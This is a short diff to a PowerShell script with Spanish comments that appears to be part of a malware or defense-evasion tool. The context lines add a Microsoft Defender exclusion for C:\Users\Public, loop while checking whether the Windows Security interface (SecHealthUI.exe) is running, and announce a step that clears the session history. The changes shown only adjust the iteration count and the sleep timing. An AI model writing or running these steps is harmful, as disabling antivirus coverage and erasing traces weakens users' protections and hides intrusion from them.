@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath "C:\Users\Public"
 
-for ($iteration = 1; $iteration -le 16; $iteration++) {
+for ($iteration = 1; $iteration -le 20; $iteration++) {
 
     # Verificar si el proceso SecHealthUI.exe está activo
     if (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
@@ -50,7 +50,7 @@ for ($iteration = 1; $iteration -le 16; $iteration++) {
         # Write-Host "Error: $_"
     }
 
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 26
 }
 
 # 1. Limpiar historial de la sesión actual
